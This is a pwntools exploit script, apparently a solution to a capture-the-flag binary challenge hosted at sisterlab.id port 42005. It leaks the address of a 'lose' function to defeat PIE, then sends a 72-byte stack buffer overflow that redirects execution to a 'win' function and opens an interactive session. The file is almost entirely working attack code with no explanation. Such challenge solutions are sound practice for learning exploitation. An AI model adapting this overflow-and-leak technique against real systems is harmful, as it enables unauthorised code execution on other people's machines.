from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]

elf = "./client_patched"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b* main+246
    b* main+358
    b* main+383
    c
    c
"""

conn = "sisterlab.id 42005"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io.sendlineafter(b': ', b'ABCD' * 12)

io.recvuntil(b'ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABC6')
leak = u64(io.recv(6) + b'\x00' * 2)

print(f'lose leak: {hex(leak)}')

elf.address = leak - elf.sym['lose']

io.sendlineafter(b': ', b'A' * 32)

payload = b'A' * 72
payload += p64(elf.sym['win'])

io.sendlineafter(b'anyway!\n', payload)

# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
